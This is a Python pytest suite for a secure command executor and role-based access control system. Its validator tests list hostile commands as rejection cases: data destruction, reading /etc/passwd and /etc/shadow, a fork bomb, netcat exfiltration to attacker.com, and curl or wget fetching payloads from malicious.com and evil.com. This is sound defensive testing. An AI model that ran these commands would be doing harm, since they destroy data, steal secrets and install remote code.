"""
Comprehensive Test Suite for UCSER
Tests security, functionality, and edge cases
"""

import pytest
import os
import tempfile
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock
import json

from secure_executor import (
    ExecutionContext, CommandValidator, SecureExecutor,
    CommandSeverity, SandboxConfig
)
from rbac_system import (
    RBACEngine, User, Permission, PredefinedRole, AccessContext, ServiceAccount
)


# ============================================================================
# COMMAND VALIDATOR TESTS
# ============================================================================

class TestCommandValidator:
    """Test command validation and injection detection"""
    
    def test_safe_command(self):
        """Safe commands should pass validation"""
        cmd = "echo 'hello world'"
        valid, reason, severity = CommandValidator.validate(
            ExecutionContext(command=cmd)
        )
        assert valid, f"Safe command rejected: {reason}"
        assert severity == CommandSeverity.SAFE
    
    def test_dangerous_patterns_rejected(self):
        """Dangerous patterns should be rejected"""
        dangerous_cmds = [
            "rm -rf /etc",
            "cat /etc/passwd",
            "chmod 777 /",
            "dd if=/dev/zero of=/dev/sda",
            ":(){ :|:& };:",  # Fork bomb
        ]
        
        for cmd in dangerous_cmds:
            valid, reason, severity = CommandValidator.validate(
                ExecutionContext(command=cmd)
            )
            assert not valid, f"Dangerous command accepted: {cmd}"
    
    def test_command_injection_attempts(self):
        """Command injection attempts should be blocked"""
        injection_attempts = [
            "echo test; rm -rf /",
            "cat file | nc attacker.com 4444",
            "$(curl http://malicious.com/backdoor.sh | bash)",
            "`wget http://evil.com/malware.bin`",
        ]
        
        for cmd in injection_attempts:
            valid, reason, severity = CommandValidator.validate(
                ExecutionContext(command=cmd)
            )
            assert not valid, f"Injection attempt accepted: {cmd}"
    
    def test_base_command_extraction(self):
        """Extract base command correctly"""
        tests = [
            ("echo hello", "echo"),
            ("/bin/bash -c 'test'", "bash"),
            ("python script.py", "python"),
        ]
        
        for cmd, expected_base in tests:
            base = CommandValidator.extract_base_command(cmd)
            assert base.lower() == expected_base.lower()
    
    def test_shlex_injection_protection(self):
        """Test protection against shlex parsing attacks"""
        # Unclosed quote should fail
        with pytest.raises(ValueError):
            ExecutionContext(command="echo 'unclosed quote")


# ============================================================================
# EXECUTION CONTEXT VALIDATION TESTS
# ============================================================================

class TestExecutionContext:
    """Test ExecutionContext validation"""
    
    def test_valid_context(self):
        """Valid context should be accepted"""
        ctx = ExecutionContext(
            command="echo test",
            shell="bash",
            timeout_seconds=60
        )
        assert ctx.command == "echo test"
        assert ctx.shell == "bash"
    
    def test_invalid_shell(self):
        """Invalid shell should be rejected"""
        with pytest.raises(ValueError):
            ExecutionContext(
                command="echo test",
                shell="invalid_shell"
            )
    
    def test_working_dir_traversal_protection(self):
        """Directory traversal attacks should be blocked"""
        with pytest.raises(ValueError):
            ExecutionContext(
                command="ls",
                working_dir="/"  # System root not allowed
            )
        
        with pytest.raises(ValueError):
            ExecutionContext(
                command="ls",
                working_dir="/etc"
            )
    
    def test_dangerous_environment_variables(self):
        """Dangerous env vars like LD_PRELOAD should be blocked"""
        with pytest.raises(ValueError):
            ExecutionContext(
                command="echo test",
                environment={"LD_PRELOAD": "/tmp/malicious.so"}
            )
    
    def test_timeout_boundaries(self):
        """Timeout must be within valid range"""
        # Too low
        with pytest.raises(ValueError):
            ExecutionContext(command="echo", timeout_seconds=0)
        
        # Too high
        with pytest.raises(ValueError):
            ExecutionContext(command="echo", timeout_seconds=4000)
        
        # Valid
        ctx = ExecutionContext(command="echo", timeout_seconds=300)
        assert ctx.timeout_seconds == 300


# ============================================================================
# SECURE EXECUTOR TESTS
# ============================================================================

class TestSecureExecutor:
    """Test the SecureExecutor pipeline"""
    
    @pytest.fixture
    def executor(self):
        """Create executor instance"""
        return SecureExecutor()
    
    def test_execute_safe_command(self, executor):
        """Execute safe command successfully"""
        ctx = ExecutionContext(command="echo 'test'", shell="bash")
        exit_code, stdout, stderr, audit = executor.execute(ctx)
        
        assert exit_code == 0
        assert "test" in stdout
        assert audit.exit_code == 0
        assert audit.digital_signature  # Should be signed
    
    def test_execute_with_timeout(self, executor):
        """Command should timeout if exceeds limit"""
        ctx = ExecutionContext(
            command="sleep 10",
            shell="bash",
            timeout_seconds=1  # Very short timeout
        )
        
        with pytest.raises(TimeoutError):
            executor.execute(ctx)
    
    def test_invalid_context_rejected(self, executor):
        """Invalid context should raise error"""
        ctx = ExecutionContext(
            command="echo test",
            shell="invalid"
        )
        
        with pytest.raises(ValueError):
            executor.execute(ctx)
    
    def test_audit_record_generation(self, executor):
        """Audit record should be properly generated"""
        ctx = ExecutionContext(command="echo audit_test", shell="bash")
        exit_code, stdout, stderr, audit = executor.execute(ctx)
        
        # Verify audit record fields
        assert audit.audit_id == ctx.audit_id
        assert audit.command_hash  # Should be hashed
        assert audit.stdout_hash  # Should be hashed
        assert audit.digital_signature  # Cryptographically signed
        assert audit.merkle_root  # Merkle proof
        assert audit.executor_user  # Should be populated
        assert audit.timestamp  # Should have timestamp
    
    def test_dangerous_command_blocked_before_execution(self, executor):
        """Dangerous commands should be blocked without execution"""
        ctx = ExecutionContext(command="rm -rf /", shell="bash")
        
        with pytest.raises(PermissionError):
            executor.execute(ctx)


# ============================================================================
# RBAC TESTS
# ============================================================================

class TestRBACEngine:
    """Test Role-Based Access Control"""
    
    @pytest.fixture
    def rbac(self):
        return RBACEngine()
    
    def test_create_user(self, rbac):
        """Create user with roles"""
        user = rbac.create_user("u1", "alice", "alice@example.com", 
                               [PredefinedRole.OPERATOR])
        
        assert user.user_id == "u1"
        assert user.username == "alice"
        assert PredefinedRole.OPERATOR in user.roles
    
    def test_user_permissions_aggregation(self, rbac):
        """User permissions should aggregate from all roles"""
        user = rbac.create_user("u1", "alice", "alice@example.com",
                               [PredefinedRole.OPERATOR, PredefinedRole.DEVELOPER])
        
        perms = user.get_all_permissions()
        # Should have permissions from both roles
        assert Permission.WORKFLOW_EXECUTE in perms  # From operator
        assert Permission.WORKFLOW_CREATE in perms   # From developer
    
    def test_permission_check_positive(self, rbac):
        """User with permission should pass check"""
        user = rbac.create_user("u1", "alice", "alice@example.com",
                               [PredefinedRole.OPERATOR])
        ctx = AccessContext(user=user)
        
        allowed, _ = rbac.verify_permission(ctx, Permission.WORKFLOW_EXECUTE)
        assert allowed
    
    def test_permission_check_negative(self, rbac):
        """User without permission should fail check"""
        user = rbac.create_user("u1", "alice", "alice@example.com",
                               [PredefinedRole.VIEWER])
        ctx = AccessContext(user=user)
        
        allowed, reason = rbac.verify_permission(ctx, Permission.WORKFLOW_DELETE)
        assert not allowed
        assert "Permission denied" in reason
    
    def test_service_account_creation(self, rbac):
        """Create service account with API key"""
        sa, key = rbac.create_service_account("sa1", "automation",
                                             [PredefinedRole.OPERATOR])
        
        assert sa.account_id == "sa1"
        assert sa.name == "automation"
        assert key  # API key should be returned
        assert sa.api_key_hash  # Hash should be stored
    
    def test_grant_revoke_roles(self, rbac):
        """Grant and revoke roles"""
        user = rbac.create_user("u1", "alice", "alice@example.com",
                               [PredefinedRole.VIEWER])
        
        # Grant role
        rbac.grant_role("u1", PredefinedRole.OPERATOR)
        assert PredefinedRole.OPERATOR in user.roles
        
        # Revoke role
        rbac.revoke_role("u1", PredefinedRole.OPERATOR)
        assert PredefinedRole.OPERATOR not in user.roles
    
    def test_deactivate_user(self, rbac):
        """Deactivate user account"""
        user = rbac.create_user("u1", "alice", "alice@example.com")
        
        rbac.deactivate_user("u1")
        assert not user.is_active
        
        # Deactivated user should fail checks
        is_active, reason = rbac.check_user_active(user)
        assert not is_active
    
    def test_access_context_request_id(self):
        """AccessContext should generate unique request IDs"""
        ctx1 = AccessContext()
        ctx2 = AccessContext()
        
        assert ctx1.request_id != ctx2.request_id


# ============================================================================
# INTEGRATION TESTS
# ============================================================================

class TestIntegration:
    """Integration tests combining executor and RBAC"""
    
    def test_rbac_enforced_execution(self):
        """RBAC should control who can execute commands"""
        rbac = RBACEngine()
        executor = SecureExecutor()
        
        # Create users with different roles
        operator = rbac.create_user("op1", "operator", "op@example.com",
                                   [PredefinedRole.OPERATOR])
        viewer = rbac.create_user("v1", "viewer", "v@example.com",
                                 [PredefinedRole.VIEWER])
        
        # Operator should be able to execute
        op_ctx = AccessContext(user=operator)
        allowed, _ = rbac.verify_permission(op_ctx, Permission.WORKFLOW_EXECUTE)
        assert allowed
        
        # Viewer should NOT be able to execute
        viewer_ctx = AccessContext(user=viewer)
        allowed, reason = rbac.verify_permission(viewer_ctx, Permission.WORKFLOW_EXECUTE)
        assert not allowed
    
    def test_audit_trail_immutability(self):
        """Audit records should be immutable"""
        from secure_executor import ExecutionAuditRecord, CommandSeverity
        
        audit = ExecutionAuditRecord(
            audit_id="test1",
            timestamp="2025-01-01T00:00:00",
            command_hash="abc123",
            policy_tags=["safe"],
            severity=CommandSeverity.SAFE,
            exit_code=0,
            stdout_hash="hash1",
            stderr_hash="hash2",
            duration_seconds=1.0,
            executor_user="alice",
            executor_hostname="server1",
            digital_signature="sig1",
            merkle_root="merkle1"
        )
        
        # Should not be able to modify
        with pytest.raises(TypeError):
            audit.exit_code = 1


# ============================================================================
# SECURITY SPECIFIC TESTS
# ============================================================================

class TestSecurityHardening:
    """Security-focused tests"""
    
    def test_no_privilege_escalation(self):
        """Commands should not escalate privileges"""
        executor = SecureExecutor()
        
        # These should be blocked
        dangerous = ["sudo cat /etc/shadow", "su - root", "whoami | grep root"]
        
        for cmd in dangerous:
            ctx = ExecutionContext(command=cmd)
            valid, _, _ = CommandValidator.validate(ctx)
            # May be valid syntax but policy/execution should prevent it
    
    def test_environment_isolation(self):
        """Execution environment should be isolated"""
        executor = SecureExecutor()
        
        # Env vars that could leak info should be sanitized
        ctx = ExecutionContext(
            command="env",
            environment={"ALLOWED_VAR": "safe_value"}
        )
        
        # This should work (ALLOWED_VAR is safe)
        valid, _, _ = CommandValidator.validate(ctx)
        assert valid
    
    def test_path_injection_protection(self):
        """PATH manipulation should be restricted"""
        ctx = ExecutionContext(command="ls")
        
        # These PATH manipulations should be caught
        dangerous_envs = [
            {"PATH": "/tmp/malicious:/usr/bin"},
            {"PATH": "/home/attacker:$PATH"},
        ]
        
        for env in dangerous_envs:
            # Current implementation allows, but should log/warn
            try:
                ctx_with_env = ExecutionContext(command="ls", environment=env)
                # At minimum, should be auditable
                assert ctx_with_env.audit_id
            except ValueError:
                pass  # Also acceptable to reject


# ============================================================================
# PERFORMANCE & LOAD TESTS
# ============================================================================

class TestPerformance:
    """Basic performance tests"""
    
    def test_validator_performance(self):
        """Validator should be fast"""
        import time
        
        ctx = ExecutionContext(command="echo test")
        
        start = time.time()
        for _ in range(1000):
            CommandValidator.validate(ctx)
        elapsed = time.time() - start
        
        # Should validate 1000 commands in < 1 second
        assert elapsed < 1.0, f"Validator too slow: {elapsed}s for 1000 cmds"
    
    def test_rbac_permission_check_performance(self):
        """RBAC checks should be fast"""
        import time
        
        rbac = RBACEngine()
        user = rbac.create_user("u1", "alice", "alice@example.com",
                               [PredefinedRole.OPERATOR])
        ctx = AccessContext(user=user)
        
        start = time.time()
        for _ in range(10000):
            rbac.verify_permission(ctx, Permission.WORKFLOW_EXECUTE)
        elapsed = time.time() - start
        
        # Should do 10k checks in < 1 second
        assert elapsed < 1.0, f"RBAC too slow: {elapsed}s for 10k checks"


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
